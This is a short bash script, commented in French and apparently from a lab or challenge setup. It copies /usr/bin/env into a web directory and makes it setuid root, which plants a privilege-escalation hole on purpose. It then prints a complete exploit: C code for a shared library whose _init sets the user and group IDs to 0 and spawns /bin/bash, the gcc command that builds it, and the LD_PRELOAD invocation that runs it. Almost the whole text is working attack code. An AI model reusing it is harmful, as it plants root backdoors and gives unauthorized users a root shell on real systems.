#!/bin/bash
# Activation d'une élévation via LD_PRELOAD

cp /usr/bin/env /var/www/html/bin/
chmod 4755 /var/www/html/bin/env

echo "✅ LD_PRELOAD exploitable. Exploitation :
echo '#include <stdio.h>
#include <stdlib.h>
void _init() {
    setgid(0);
    setuid(0);
    system(\"/bin/bash\");
}' > /var/www/html/tmp/exploit.c

gcc -fPIC -shared -o /var/www/html/tmp/exploit.so /var/www/html/tmp/exploit.c -nostartfiles
env LD_PRELOAD=/var/www/html/tmp/exploit.so /bin/ls"
